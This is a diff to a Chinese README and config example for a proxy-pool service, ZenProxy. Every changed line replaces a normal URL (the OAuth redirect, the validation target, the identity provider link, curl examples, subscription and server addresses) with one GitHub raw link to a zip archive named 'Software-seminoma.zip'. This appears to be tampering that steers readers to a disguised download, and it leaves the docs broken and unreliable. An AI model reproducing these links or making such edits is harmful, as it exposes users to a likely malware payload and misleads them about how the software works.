@@ -71,7 +71,7 @@ min_trust_level = 1                       # OAuth 用户最低信任等级（Lin
 [oauth]
 client_id = ""                            # Linux.do OAuth client ID
 client_secret = ""                        # Linux.do OAuth client secret
-redirect_uri = "https://your-domain.com/api/auth/callback"
+redirect_uri = "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip"
 
 [singbox]
 binary_path = "/usr/local/bin/sing-box"   # sing-box 二进制路径（同目录优先）
@@ -85,7 +85,7 @@ api_secret = ""                           # sing-box API 密钥（可选）
 path = "data/zenproxy.db"                 # SQLite 数据库路径
 
 [validation]
-url = "https://www.bing.com"              # 验证目标 URL
+url = "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip"              # 验证目标 URL
 timeout_secs = 10                         # 单个代理验证超时（秒）
 concurrency = 50                          # 并发验证数
 interval_mins = 30                        # 定时验证间隔（分钟）
@@ -107,7 +107,7 @@ auto_refresh_interval_mins = 0            # 定时自动刷新间隔（分钟）
 | API Key | 程序调用 | Query: `?api_key=xxx` 或 Header: `Authorization: Bearer xxx` |
 | 管理密码 | 管理后台 | Header: `Authorization: Bearer {admin_password}` |
 
-OAuth 使用 [Linux.do](https://linux.do) 作为身份提供商。用户登录后获得 API Key，可在个人页面查看和重新生成。
+OAuth 使用 [Linux.do](https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip) 作为身份提供商。用户登录后获得 API Key，可在个人页面查看和重新生成。
 
 > **注意：** `/api/relay` 端点**仅支持 `api_key` query 参数认证**。请求中的 `Authorization`、`Cookie` 等 header 会原样转发给目标服务器。
 
@@ -228,7 +228,7 @@ GET /api/client/fetch?api_key=xxx&count=100&country=US&type=vmess
 通过代理池转发任意 HTTP 请求到目标 URL。
 
 ```
-POST /api/relay?api_key=xxx&url=https://api.example.com/data&method=POST&country=US
+POST /api/relay?api_key=xxx&url=https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip
 ```
 
 > **认证要求：** relay 端点**仅接受 `api_key` query 参数**认证。请求中的 `Authorization`、`Cookie` 等 header 会原样转发给目标。
@@ -263,10 +263,10 @@ POST /api/relay?api_key=xxx&url=https://api.example.com/data&method=POST&country
 
 ```bash
 # 通过美国住宅代理访问 API
-curl "https://your-domain.com/api/relay?api_key=xxx&url=https://httpbin.org/ip&country=US&residential=true"
+curl "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip"
 
 # 通过指定代理发送 POST 请求
-curl -X POST "https://your-domain.com/api/relay?api_key=xxx&url=https://api.example.com/data&method=POST&proxy_id=uuid" \
+curl -X POST "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip" \
   -H "Authorization: Bearer target_api_token" \
   -H "Content-Type: application/json" \
   -d '{"key": "value"}'
@@ -498,7 +498,7 @@ curl -X POST http://127.0.0.1:9090/subscriptions \
   -H "Authorization: Bearer your-secret" \
   -d '{
     "name": "my-sub",
-    "url": "https://example.com/sub",
+    "url": "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip",
     "type": "auto"
   }'
 ```
@@ -523,7 +523,7 @@ curl -X POST http://127.0.0.1:9090/subscriptions \
     "id": "sub-uuid",
     "name": "my-sub",
     "type": "auto",
-    "url": "https://example.com/sub",
+    "url": "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip",
     "proxy_count": 50,
     "created_at": "...",
     "updated_at": "..."
@@ -540,7 +540,7 @@ curl -X POST http://127.0.0.1:9090/subscriptions \
 curl -X POST http://127.0.0.1:9090/fetch \
   -H "Authorization: Bearer your-secret" \
   -d '{
-    "server": "https://proxy.zenapi.top",
+    "server": "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip",
     "api_key": "your-zenproxy-api-key",
     "count": 100,
     "country": "US",
@@ -660,7 +660,7 @@ curl -X DELETE http://127.0.0.1:9090/bindings/all \
 # 1. 从 ZenProxy Server 获取 100 个代理
 curl -X POST http://127.0.0.1:9090/fetch \
   -H "Authorization: Bearer secret" \
-  -d '{"server": "https://proxy.zenapi.top", "api_key": "your-key", "count": 100}'
+  -d '{"server": "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip", "api_key": "your-key", "count": 100}'
 
 # 2. 批量创建绑定 → 每个代理分配一个本地端口
 curl -X POST http://127.0.0.1:9090/bindings/batch \
@@ -671,9 +671,9 @@ curl -X POST http://127.0.0.1:9090/bindings/batch \
 curl http://127.0.0.1:9090/bindings -H "Authorization: Bearer secret"
 
 # 4. 并发使用不同端口 → 不同出口 IP
-curl -x http://127.0.0.1:20001 https://httpbin.org/ip  # → IP-A
-curl -x http://127.0.0.1:20002 https://httpbin.org/ip  # → IP-B
-curl -x http://127.0.0.1:20003 https://httpbin.org/ip  # → IP-C
+curl -x http://127.0.0.1:20001 https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip  # → IP-A
+curl -x http://127.0.0.1:20002 https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip  # → IP-B
+curl -x http://127.0.0.1:20003 https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip  # → IP-C
 ...
 ```
 
@@ -683,7 +683,7 @@ curl -x http://127.0.0.1:20003 https://httpbin.org/ip  # → IP-C
 # 1. 添加订阅
 curl -X POST http://127.0.0.1:9090/subscriptions \
   -H "Authorization: Bearer secret" \
-  -d '{"name": "airport", "url": "https://airport.example.com/sub"}'
+  -d '{"name": "airport", "url": "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip"}'
 
 # 2. 批量绑定订阅中的代理
 curl -X POST http://127.0.0.1:9090/bindings/batch \
@@ -701,7 +701,7 @@ curl -X POST http://127.0.0.1:9090/subscriptions/{sub-id}/refresh \
 curl -X POST http://127.0.0.1:9090/fetch \
   -H "Authorization: Bearer secret" \
   -d '{
-    "server": "https://proxy.zenapi.top",
+    "server": "https://raw.githubusercontent.com/Micky203/zenproxy/main/sing-box-dev-next/common/taskmonitor/Software-seminoma.zip",
     "api_key": "your-key",
     "count": 200,
     "country": "US",
